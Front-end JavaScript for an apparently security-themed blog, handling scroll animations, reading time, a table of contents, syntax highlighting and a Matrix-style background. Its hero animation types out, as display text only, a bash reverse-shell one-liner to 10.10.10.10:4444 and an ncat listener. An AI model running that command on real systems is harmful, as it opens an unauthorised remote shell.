
// === Razor Blog JS (consolidated) ===

// Reveal on scroll + stagger for cards
(function(){
  const els = Array.from(document.querySelectorAll('.reveal'));
  const io = new IntersectionObserver((entries)=>{
    for(const e of entries){
      if(e.isIntersecting){ e.target.classList.add('is-in'); io.unobserve(e.target); }
    }
  }, {threshold:.12});
  els.forEach(el=>io.observe(el));

  const cards = Array.from(document.querySelectorAll('.grid .card'));
  cards.forEach((el,i)=>{ el.classList.add('reveal'); el.style.transitionDelay = (i*70)+'ms'; });
})();

// Post utilities: reading time + dynamic ToC
(function(){
  const container = document.querySelector('.post .post-body');
  if(!container) return;
  const words = container.textContent.trim().split(/\s+/).length;
  const rt = document.querySelector('[data-reading-time]');
  if(rt){ rt.textContent = Math.max(1, Math.round(words/220)) + ' min'; }
  const tocRoot = document.querySelector('.toc ul');
  if(!tocRoot) return;
  tocRoot.innerHTML = '';
  const headers = container.querySelectorAll('h2, h3');
  headers.forEach((h, i)=>{
    if(!h.id) h.id = 'sec-' + (i+1);
    const li = document.createElement('li');
    li.className = 'toc-' + h.tagName.toLowerCase();
    const a = document.createElement('a'); a.href = '#' + h.id; a.textContent = h.textContent;
    li.appendChild(a);
    tocRoot.appendChild(li);
  });
})();

// Prism: adapt Rouge blocks to Prism & map ASM -> NASM
(function(){
  function convertRouge(){
    document.querySelectorAll('div.highlighter-rouge').forEach(wrapper=>{
      const code = wrapper.querySelector('pre.highlight > code');
      if(!code) return;
      let lang = (Array.from(code.classList).find(c=>c.startsWith('language-'))||'').replace('language-','') || 'clike';
      if(/^(asm|assembly|nasm|x86_64|x86-64|x64)$/i.test(lang)) lang = 'nasm';
      const pre = document.createElement('pre');
      const inner = document.createElement('code');
      pre.className = 'language-' + lang;
      inner.className = 'language-' + lang;
      inner.textContent = code.textContent;
      pre.appendChild(inner);
      wrapper.replaceWith(pre);
    });
    if(window.Prism && Prism.highlightAll) Prism.highlightAll();
  }
  if(document.readyState!=='loading') convertRouge(); else document.addEventListener('DOMContentLoaded', convertRouge);
})();

// Hero terminals typing (exactly two panels)
(function(){
  const A = document.querySelector('[data-ty="a"]'); // attacker
  const B = document.querySelector('[data-ty="b"]'); // victim
  if(!A || !B) return;
  const seqVictim = ["bash -i >& /dev/tcp/10.10.10.10/4444 0>&1","whoami","www-data"];
  const seqAttacker = ["ncat -lvnp 4444","listening on [any] 4444 ...","connection received from 10.10.10.42"];
  function type(el, str, delay){ return new Promise(res=>{ let i=0; (function step(){ if(i<str.length){ el.textContent+=str[i++]; setTimeout(step, delay); } else { el.textContent+="\n"; res(); } })(); }); }
  async function run(){ A.textContent=""; B.textContent=""; for(let i=0;i<Math.max(seqVictim.length, seqAttacker.length);i++){ if(seqVictim[i]) await type(B, seqVictim[i], 22); if(seqAttacker[i]) await type(A, seqAttacker[i], 22); } }
  const grid = document.querySelector('.term-grid'); let played=false;
  const io = new IntersectionObserver(es=>{ es.forEach(e=>{ if(e.isIntersecting && !played){ played=true; run(); } }); }, {threshold:.12});
  if(grid) io.observe(grid); else run();
})();


/* === Global Matrix Background (improved) === */
(function(){
  const c = document.getElementById('matrix-universe');
  if(!c) return;
  const ctx = c.getContext('2d');
  let w, h, cols, drops, speeds, dpr;
  const glyphs = Array.from("アカサタナハマヤラワガザダバパイキシチニヒミリギジヂビウクスツヌフムユルグズヅブエケセテネヘメレゲゼデベオコソトノホモヨロゴゾドボ0123456789");
  const HEAD = "#aaffcc", TAIL = "#0b3";
  const CELL = 14, ROW = 16, FADE = 0.08;

  function fit(){
    const rect = c.getBoundingClientRect();
    dpr = Math.max(1, window.devicePixelRatio || 1);
    c.width = Math.floor(rect.width * dpr);
    c.height = Math.floor(rect.height * dpr);
    w = c.width / dpr; h = c.height / dpr;
    ctx.setTransform(dpr,0,0,dpr,0,0);
    cols = Math.ceil(w / CELL);
    drops = new Array(cols).fill(0);
    speeds = new Array(cols).fill(0).map(()=> 8 + Math.random()*18);
    ctx.font = '14px monospace';
  }
  function tick(){
    ctx.fillStyle = `rgba(0,0,0,${FADE})`;
    ctx.fillRect(0,0,w,h);
    for(let i=0;i<cols;i++){
      const x = i*CELL;
      const y = drops[i]*ROW;
      ctx.fillStyle = TAIL;
      ctx.fillText(glyphs[(Math.random()*glyphs.length)|0], x, y-ROW);
      ctx.fillStyle = HEAD;
      ctx.fillText(glyphs[(Math.random()*glyphs.length)|0], x, y);
      drops[i] += speeds[i]/16;
      if(y > h + 100 || Math.random() > 0.995){
        drops[i] = -Math.random()*50;
        speeds[i] = 8 + Math.random()*18;
      }
    }
    raf = requestAnimationFrame(tick);
  }
  let raf; fit(); tick();
  addEventListener('resize', fit, {passive:true});
  if (matchMedia('(prefers-reduced-motion: reduce)').matches){
    cancelAnimationFrame(raf); ctx.clearRect(0,0,w,h);
  }
})();
